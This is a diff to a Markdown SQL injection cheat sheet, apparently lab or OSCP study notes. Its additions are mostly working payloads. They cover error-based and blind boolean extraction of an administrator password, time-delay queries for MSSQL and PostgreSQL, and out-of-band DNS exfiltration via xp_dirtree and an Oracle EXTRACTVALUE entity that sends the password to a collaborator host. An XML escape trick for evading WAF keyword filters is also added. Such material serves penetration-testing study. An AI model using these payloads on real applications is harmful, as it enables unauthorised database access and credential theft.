@@ -198,7 +198,7 @@ administrator'#
 
 # Error Based SQLi
 
-Use CONVERT or CAST to force an ERROR and see the output of the query on errors logs.
+Use `CONVERT` or `CAST` to force an ERROR and see the output of the query on errors logs.
 
 _Example of Microsoft SQL Server:_
 
@@ -229,6 +229,10 @@ AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-- -)
 AND updatexml(rand(),concat(CHAR(126),user(),CHAR(126)),null)-- -)
 ```
 
+```
+AND 1=CAST((SELECT example_column FROM example_table) AS int)
+```
+
 # Blind SQLi
 
 A SQLi is blind because we don't have access to the error log or any type of output which difficult a lot the process of exploitation.
@@ -253,6 +257,7 @@ xyz' AND LENGTH((SELECT password FROM users WHERE username='admin')) = 15 -- -
 ```
 xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) >'m
 xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 1, 1) ='s
+xyz' AND SUBSTRING((SELECT password FROM USERS WHERE username='admin'), 2, 1) ='a
 ```
 
 The following is a python example script to automate the data retrieval of a alphanumerical 20 characters length password.
@@ -362,17 +367,38 @@ xyz' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 
 xyz' || (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 's') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') ||'a
 ```
 
+_Example of Mysql query:_
 
-## Time Based
+```
+xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
+```
 
-Since we are not aware about any type of error or output we can use sleeps.
+## Triggering time delays (time based)
+
+Since we are not aware about any type of error or output we can use sleeps if the applications **works synchronously**.
 
 ```
 '; IF (1=2) WAITFOR DELAY '0:0:10'-- -
 '; IF (1=1) WAITFOR DELAY '0:0:10'-- -
 ```
 
-If it loads for four seconds extra we know that the database is processing our `sleep()` command.
+If it loads for 10 seconds extra we know that the database is processing our `sleep()` command.
+
+We can use this info to obtain information.
+
+* _Example of mssql_
+
+```
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+```
+
+* _Example of postgresql_
+
+```
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END
+```
 
 ### Dump tables
 
@@ -397,6 +423,40 @@ print()
 > **Note:** MD5 hash are hexadecimal with 33 character length.
 
 * [https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)
+
+
+## Using out-of-band (OAST) techniques
+
+An application might carry out the same SQL query as the previous example but **do it asynchronously**. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie.
+
+So we can do DNS queries to exfiltrate data.
+
+* _Examaple of mssql_
+
+```
+'; exec master..xp_dirtree '//burpcollaborator.net/a'--
+
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.burpcollaborator.net/a"')--
+```
+
+* _Example of OracleDB_
+
+```
+' union SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT 'a')||'.collaborator.com/"> %remote;]>'),'/l') FROM dual-- -
+```
+
+# SQL injection in different contexts
+
+In the previous labs, you used the query string to inject your malicious SQL payload. However, you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database. 
+
+These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`: 
+
+```
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+```
 
 
 # Cheat Sheet
@@ -592,7 +652,7 @@ WAITFOR DELAY '0:0:10'
 
 * **PostgreSQL**:
 ```
-SELECT pg_sleep(10)
+SELECT 1 FROM pg_sleep(10)
 ```
 
 * **MySQL**:
